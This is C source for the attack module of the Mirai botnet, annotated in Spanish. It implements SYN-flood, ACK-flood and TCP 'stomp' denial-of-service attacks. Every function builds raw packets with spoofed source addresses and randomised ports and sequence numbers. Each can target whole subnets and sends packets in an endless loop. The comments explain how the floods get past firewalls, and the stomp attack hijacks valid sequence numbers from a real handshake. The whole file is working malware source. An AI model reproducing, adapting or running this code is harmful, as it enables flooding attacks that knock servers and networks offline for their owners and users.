/***************************************************************************
 * Archivo: attack_tcp.c
 * 
 * Descripción: Implementación de ataques TCP especializados para Mirai
 * Este módulo implementa tres tipos principales de ataques TCP:
 * 1. SYN Flood - Inundación con paquetes SYN
 * 2. ACK Flood - Inundación con paquetes ACK
 * 3. Stomp - Ataque avanzado con manipulación de secuencias
 * 
 * Características principales:
 * - Generación de paquetes TCP malformados
 * - Spoofing de direcciones IP y puertos
 * - Control de flags TCP (SYN,ACK,RST,etc)
 * - Soporte para ataques a subredes
 * - Opciones TCP personalizables
 * 
 * Referencias:
 * - RFC 793 (TCP)
 * - TCP/IP Illustrated Vol. 1
 ***************************************************************************/

/* Habilitar extensiones GNU */
#define _GNU_SOURCE

/* Cabeceras del sistema */
#ifdef DEBUG
#include <stdio.h>     /* printf() - Solo para depuración */
#endif
#include <stdlib.h>    /* malloc(), free(), etc */
#include <unistd.h>    /* close() */
#include <sys/socket.h> /* socket(), setsockopt() */
#include <linux/ip.h>  /* struct iphdr */
#include <linux/tcp.h> /* struct tcphdr */
#include <fcntl.h>     /* fcntl(), O_NONBLOCK */
#include <errno.h>     /* errno, códigos de error */

/* Cabeceras locales */
#include "includes.h"  /* Definiciones comunes */
#include "attack.h"    /* Estructuras de ataque */
#include "checksum.h"  /* Cálculo de checksums */
#include "rand.h"      /* Generación de números aleatorios */

/*
 * Ataque de Inundación TCP SYN
 *
 * Implementa un ataque clásico de SYN flood que agota los recursos del servidor
 * enviando muchas conexiones TCP medio abiertas. Este ataque:
 * - Envía paquetes SYN con IPs/puertos aleatorios
 * - Incluye opciones TCP válidas para evadir firewalls
 * - Nunca completa el handshake de 3 vías
 * - Consume slots de conexiones TCP en el objetivo
 *
 * @param targs_len   Número de objetivos
 * @param targs       Array de estructuras con datos de objetivos 
 * @param opts_len    Número de opciones
 * @param opts        Array de opciones para personalizar el ataque
 */
void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;
    
    /* Asignar memoria para array de paquetes */
    char **pkts = calloc(targs_len, sizeof (char *));

    /* Opciones de la cabecera IP 
     * - ip_tos: Tipo de servicio
     * - ip_ident: ID del paquete
     * - ip_ttl: Time to live
     * - dont_frag: No fragmentar
     */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);

    /* Opciones de puertos TCP
     * - sport: Puerto origen (puede ser aleatorio)
     * - dport: Puerto destino (puede ser aleatorio)
     */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    /* Números de secuencia y ACK
     * - seq: Número de secuencia inicial
     * - ack: Número de ACK (normalmente 0 en SYN)
     */
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);

    /* Flags TCP
     * Por defecto solo SYN activo para este ataque
     */
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);

    /* IP origen (puede ser spoofeada) */
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    /* Crear socket raw para enviar paquetes TCP personalizados */
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Error al crear socket raw. Abortando ataque\n");
#endif
        return;
    }
    
    /* Activar IP_HDRINCL para manipular cabecera IP manualmente */
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Error al configurar IP_HDRINCL. Abortando\n");
#endif
        close(fd);
        return;
    }

    /* Iterar por cada objetivo y crear su paquete TCP SYN */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros a las cabeceras dentro del paquete */
        struct iphdr *iph;     /* Cabecera IP */
        struct tcphdr *tcph;   /* Cabecera TCP */
        uint8_t *opts;         /* Opciones TCP */

        /* Reservar memoria para el paquete (128 bytes) */
        pkts[i] = calloc(128, sizeof (char));
        
        /* Posicionar punteros a las cabeceras */
        iph = (struct iphdr *)pkts[i];              /* IP al inicio */
        tcph = (struct tcphdr *)(iph + 1);          /* TCP después de IP */
        opts = (uint8_t *)(tcph + 1);               /* Opciones después de TCP */

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        // TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
        *opts++ = 4;                    // Length
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);

        // TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        // TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);

        // TCP nop
        *opts++ = 1;

        // TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6; // 2^6 = 64, window size scale = 64
    }

    /* Bucle principal del ataque: envío continuo de paquetes */
    while (TRUE)
    {
        /* Iterar por todos los objetivos */
        for (i = 0; i < targs_len; i++)
        {
            /* Obtener referencias a las cabeceras del paquete */
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            
            /* Para ataques a subred: generar IP aleatoria dentro del rango */
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            /* Aleatorizar campos si se especificó en las opciones */
            if (source_ip == 0xffffffff)  /* IP origen aleatoria */
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)       /* ID de paquete aleatorio */
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)          /* Puerto origen aleatorio */
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)          /* Puerto destino aleatorio */
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)            /* Número de secuencia aleatorio */
                tcph->seq = rand_next();
            if (ack == 0xffff)            /* Número de ACK aleatorio */ 
                tcph->ack_seq = rand_next();
            if (urg_fl)                   /* Puntero urgente aleatorio si URG activo */
                tcph->urg_ptr = rand_next() & 0xffff;

            /* Calcular checksum IP
             * 1. Poner checksum a 0
             * 2. Calcular checksum sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* Calcular checksum TCP
             * 1. Poner checksum a 0  
             * 2. Calcular checksum usando pseudo-cabecera IP+TCP
             */
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);

            /* Actualizar puerto destino en la estructura de socket */
            targs[i].sock_addr.sin_port = tcph->dest;

            /* Enviar el paquete TCP SYN usando socket raw
             * - Tamaño total: IP + TCP + opciones TCP
             * - MSG_NOSIGNAL: No generar SIGPIPE si hay error
             */
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno); /* Imprimir errno en modo debug */
#endif
    }
}

/*
 * Ataque de Inundación TCP ACK
 *
 * Implementa un ataque de inundación usando paquetes TCP ACK. Este tipo de ataque:
 * - Envía grandes volúmenes de paquetes ACK falsos
 * - Consume ancho de banda del objetivo
 * - Puede pasar algunos tipos de firewalls que permiten paquetes ACK
 * - Útil contra sistemas que filtran SYN pero no ACK
 *
 * @param targs_len   Número de objetivos 
 * @param targs       Array de estructuras con datos de objetivos
 * @param opts_len    Número de opciones
 * @param opts        Array de opciones para personalizar el ataque
 */
void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;

    /* Arreglo de paquetes, uno por objetivo */
    char **pkts = calloc(targs_len, sizeof (char *));

    /* Opciones de la cabecera IP */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);        /* Tipo de servicio */
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff); /* ID de paquete */
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);       /* Time to live */
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);     /* No fragmentar */

    /* Opciones de puertos TCP */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);      /* Puerto origen */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);      /* Puerto destino */

    /* Números de secuencia y ACK */
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);     /* Número de secuencia */
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);     /* Número de ACK */

    /* Flags TCP - ACK por defecto activo */
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);          /* URG flag */
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);           /* ACK flag */
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);          /* PSH flag */
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);          /* RST flag */
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);          /* SYN flag */
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);          /* FIN flag */

    /* Opciones de payload/datos */
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);   /* Tamaño del payload */
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE); /* Payload aleatorio */

    /* IP origen (puede ser spoofeada) */
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    /* Crear socket raw para enviar paquetes TCP personalizados */
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Error al crear socket raw. Abortando ataque\n");
#endif
        return;
    }

    /* Activar IP_HDRINCL para manipular cabecera IP manualmente */
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Error al configurar IP_HDRINCL. Abortando\n");
#endif
        close(fd);
        return;
    }

    /* Crear paquetes para cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros a las secciones del paquete */
        struct iphdr *iph;     /* Cabecera IP */
        struct tcphdr *tcph;   /* Cabecera TCP */
        char *payload;         /* Datos/Payload */

        /* Reservar memoria para el paquete completo (MTU estándar) */
        pkts[i] = calloc(1510, sizeof (char));

        /* Posicionar punteros a las secciones */
        iph = (struct iphdr *)pkts[i];              /* IP al inicio */
        tcph = (struct tcphdr *)(iph + 1);          /* TCP después de IP */
        payload = (char *)(tcph + 1);               /* Payload después de TCP */

        /* Configurar cabecera IP */
        iph->version = 4;                           /* IPv4 */
        iph->ihl = 5;                              /* Longitud cabecera: 5 x 4 = 20 bytes */
        iph->tos = ip_tos;                         /* Tipo de servicio */
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len); /* Longitud total */
        iph->id = htons(ip_ident);                 /* ID del paquete */
        iph->ttl = ip_ttl;                         /* Time to Live */
        if (dont_frag)
            iph->frag_off = htons(1 << 14);        /* Flag Don't Fragment */
        iph->protocol = IPPROTO_TCP;               /* Protocolo: TCP */
        iph->saddr = source_ip;                    /* IP origen (puede ser spoofeada) */
        iph->daddr = targs[i].addr;                /* IP destino del objetivo */

        /* Configurar cabecera TCP */
        tcph->source = htons(sport);                /* Puerto origen */
        tcph->dest = htons(dport);                 /* Puerto destino */
        tcph->seq = htons(seq);                    /* Número de secuencia */
        tcph->doff = 5;                           /* Data offset: 5 x 4 = 20 bytes (sin opciones) */
        
        /* Configurar flags TCP */
        tcph->urg = urg_fl;                        /* URG flag */
        tcph->ack = ack_fl;                        /* ACK flag (activo por defecto) */
        tcph->psh = psh_fl;                        /* PSH flag */
        tcph->rst = rst_fl;                        /* RST flag */
        tcph->syn = syn_fl;                        /* SYN flag */
        tcph->fin = fin_fl;                        /* FIN flag */
        
        /* Ventana TCP aleatoria */
        tcph->window = rand_next() & 0xffff;
        
        /* Forzar PSH si se especificó */
        if (psh_fl)
            tcph->psh = TRUE;

        /* Generar payload aleatorio si se solicitó */
        rand_str(payload, data_len);
    }

    /* Código comentado: ejemplo de envío simple 
    targs[0].sock_addr.sin_port = tcph->dest;
    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
    {
        // Manejar error
    }
    */

    /* Bucle principal del ataque */
    while (TRUE)
    {
        /* Iterar por todos los objetivos */
        for (i = 0; i < targs_len; i++)
        {
            /* Obtener referencias a las secciones del paquete */
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;          /* Cabecera IP */
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1); /* Cabecera TCP */
            char *data = (char *)(tcph + 1);                  /* Payload */

            /* Para ataques a subred: generar IP aleatoria dentro del rango */
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            /* Aleatorizar campos si se especificó en las opciones */
            if (source_ip == 0xffffffff)     /* IP origen aleatoria */
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)          /* ID de paquete aleatorio */
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)             /* Puerto origen aleatorio */
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)             /* Puerto destino aleatorio */
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)               /* Número de secuencia aleatorio */
                tcph->seq = rand_next();
            if (ack == 0xffff)               /* Número de ACK aleatorio */
                tcph->ack_seq = rand_next();

            /* Generar nuevo payload aleatorio si está activado */
            if (data_rand)
                rand_str(data, data_len);

            /* Calcular checksum IP
             * 1. Poner checksum a 0
             * 2. Calcular checksum sobre toda la cabecera IP 
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* Calcular checksum TCP
             * 1. Poner checksum a 0
             * 2. Calcular checksum usando pseudo-cabecera IP+TCP
             */
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            /* Actualizar puerto destino en la estructura de socket */
            targs[i].sock_addr.sin_port = tcph->dest;

            /* Enviar el paquete TCP ACK usando socket raw 
             * - Tamaño total: IP + TCP + payload
             * - MSG_NOSIGNAL: No generar SIGPIPE si hay error
             */
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno); /* Imprimir errno en modo debug */
#endif
    }
}

/*
 * Ataque TCP Stomp
 *
 * Implementa un ataque sofisticado que manipula números de secuencia TCP:
 * - Establece conexión TCP legítima inicialmente
 * - Captura números de secuencia/ACK válidos
 * - Envía datos falsos usando números válidos
 * - Causa confusión en el estado de la conexión
 * - Puede causar corrupción de datos y desincronización
 *
 * @param targs_len   Número de objetivos
 * @param targs       Array de estructuras con datos de objetivos
 * @param opts_len    Número de opciones  
 * @param opts        Array de opciones para personalizar el ataque
 */
void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, rfd;

    /* Estructuras de datos para el ataque */
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data)); /* Info por objetivo */
    char **pkts = calloc(targs_len, sizeof (char *));                                            /* Paquetes */

    /* Opciones de la cabecera IP */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);          /* Tipo de servicio */
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff); /* ID de paquete */
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);         /* Time to Live */
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);        /* No fragmentar */

    /* Puerto destino (origen se captura del SYN-ACK) */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    /* Flags TCP - PSH+ACK por defecto */
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);            /* URG flag */
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);             /* ACK flag */
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);             /* PSH flag */
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);            /* RST flag */
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);            /* SYN flag */
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);            /* FIN flag */

    /* Opciones de payload/datos */
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);     /* Tamaño del payload */
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);  /* Payload aleatorio */

    /* Crear socket raw para recibir paquetes TCP */
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Error al crear socket raw para recepción!\n");
#endif
        return;
    }

    /* Activar IP_HDRINCL para manipular cabecera IP manualmente */
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Error al configurar IP_HDRINCL. Abortando\n");
#endif
        close(rfd);
        return;
    }

    /* Obtener números de secuencia/ACK válidos para cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        int fd;                                /* Socket para conexión inicial */
        struct sockaddr_in addr, recv_addr;    /* Estructuras para direcciones */
        socklen_t recv_addr_len;               /* Longitud de dirección recibida */
        char pktbuf[256];                      /* Buffer para paquetes recibidos */
        time_t start_recv;                     /* Tiempo inicio de recepción */

        /* Etiqueta para reintentar la configuración */
        stomp_setup_nums:

        /* Crear socket TCP normal para conexión inicial */
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Error al crear socket TCP!\n");
#endif
            continue;
        }

        /* Configurar socket como no bloqueante para timeout */
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
 
        /* Configurar dirección del objetivo */
        addr.sin_family = AF_INET;  /* IPv4 */

        /* IP destino - aleatoria dentro de subred si es ataque a red */
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;

        /* Puerto destino - aleatorio o específico */  
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);

        /* Iniciar conexión TCP no bloqueante */
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);  /* Marca de tiempo inicio recepción */

        /* Bucle de captura de paquetes para obtener números de secuencia */
        while (TRUE)
        {
            int ret;

            /* Recibir paquetes TCP en socket raw */
            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, 
                          (struct sockaddr *)&recv_addr, &recv_addr_len);

            /* Verificar error de recepción */
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Error al escuchar en socket raw!\n");
#endif
                return;
            }

            /* Verificar si el paquete es del objetivo y tiene tamaño válido */
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && 
                ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                /* Obtener cabecera TCP del paquete recibido */
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));

                /* Verificar si es respuesta del puerto objetivo */
                if (tcph->source == addr.sin_port)
                {
                    /* Detectar SYN+ACK (respuesta al SYN inicial) */
                    if (tcph->syn && tcph->ack)
                    {
                        /* Punteros para construir paquete de respuesta */
                        struct iphdr *iph;      /* Cabecera IP */
                        struct tcphdr *tcph;    /* Cabecera TCP */  
                        char *payload;          /* Datos/Payload */

                        /* Guardar información de la conexión establecida */
                        stomp_data[i].addr = addr.sin_addr.s_addr;         /* IP objetivo */
                        stomp_data[i].seq = ntohl(tcph->seq);             /* SEQ del servidor */
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);     /* ACK del servidor */
                        stomp_data[i].sport = tcph->dest;                 /* Puerto origen (local) */
                        stomp_data[i].dport = addr.sin_port;             /* Puerto destino */

#ifdef DEBUG
                        printf("Stomp: SYN+ACK recibido!\n");
#endif
                        /* Crear paquete para el ataque */
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        
                        /* Posicionar punteros a las secciones */
                        iph = (struct iphdr *)pkts[i];               /* IP al inicio */
                        tcph = (struct tcphdr *)(iph + 1);           /* TCP después de IP */
                        payload = (char *)(tcph + 1);                /* Payload después de TCP */

                        /* Configurar cabecera IP */
                        iph->version = 4;                            /* IPv4 */
                        iph->ihl = 5;                               /* Longitud cabecera: 5 x 4 = 20 bytes */
                        iph->tos = ip_tos;                          /* Tipo de servicio */
                        iph->tot_len = htons(sizeof (struct iphdr) + 
                                           sizeof (struct tcphdr) + data_len); /* Longitud total */
                        iph->id = htons(ip_ident);                  /* ID del paquete */
                        iph->ttl = ip_ttl;                          /* Time to Live */
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);         /* Flag Don't Fragment */
                        iph->protocol = IPPROTO_TCP;                /* Protocolo: TCP */
                        iph->saddr = LOCAL_ADDR;                    /* IP origen (local) */
                        iph->daddr = stomp_data[i].addr;           /* IP destino capturada */

                        /* Configurar cabecera TCP usando valores capturados */
                        tcph->source = stomp_data[i].sport;          /* Puerto origen capturado */
                        tcph->dest = stomp_data[i].dport;            /* Puerto destino capturado */
                        tcph->seq = stomp_data[i].ack_seq;          /* Usar ACK recibido como SEQ */
                        tcph->ack_seq = stomp_data[i].seq;          /* Usar SEQ recibido como ACK */
                        tcph->doff = 8;                             /* Data offset: 8 x 4 = 32 bytes */
                        
                        /* Configurar flags TCP */
                        tcph->fin = TRUE;                           /* FIN para cerrar conexión */
                        tcph->ack = TRUE;                           /* ACK siempre activo */
                        tcph->window = rand_next() & 0xffff;        /* Ventana aleatoria */
                        tcph->urg = urg_fl;                         /* URG flag según opción */
                        tcph->ack = ack_fl;                         /* ACK flag según opción */
                        tcph->psh = psh_fl;                         /* PSH flag según opción */
                        tcph->rst = rst_fl;                         /* RST flag según opción */
                        tcph->syn = syn_fl;                         /* SYN flag según opción */
                        tcph->fin = fin_fl;                         /* FIN flag según opción */

                        /* Generar payload aleatorio */
                        rand_str(payload, data_len);
                        break;
                    }
                    /* Si recibimos FIN o RST, reintentar conexión */
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            /* Timeout después de 10 segundos */
            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Timeout al conectar para Stomp. Reintentando\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }

    /* Bucle principal del ataque: envío continuo de paquetes */
    while (TRUE)
    {
        /* Iterar por todos los objetivos */
        for (i = 0; i < targs_len; i++)
        {
            /* Obtener referencias a las secciones del paquete */
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;           /* Cabecera IP */
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);  /* Cabecera TCP */
            char *data = (char *)(tcph + 1);                   /* Payload */

            /* ID de paquete aleatorio si se especificó */
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            /* Generar nuevo payload aleatorio si está activado */
            if (data_rand)
                rand_str(data, data_len);

            /* Calcular checksum IP
             * 1. Poner checksum a 0
             * 2. Calcular checksum sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* Actualizar números de secuencia y calcular checksum TCP
             * 1. Incrementar SEQ para simular envío de datos
             * 2. Mantener mismo ACK (conexión ya establecida)
             * 3. Recalcular checksum TCP con pseudo-cabecera
             */
            tcph->seq = htons(stomp_data[i].seq++);           /* Incrementar SEQ */
            tcph->ack_seq = htons(stomp_data[i].ack_seq);     /* Mantener ACK */
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, 
                         htons(sizeof (struct tcphdr) + data_len),
                         sizeof (struct tcphdr) + data_len);

            /* Actualizar puerto destino en estructura de socket */
            targs[i].sock_addr.sin_port = tcph->dest;

            /* Enviar el paquete TCP usando socket raw
             * - Tamaño total: IP + TCP + payload
             * - MSG_NOSIGNAL: No generar SIGPIPE si hay error
             * - Usar socket raw abierto al inicio
             */
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len,
                   MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno); /* Imprimir errno en modo debug */
#endif
    }
}
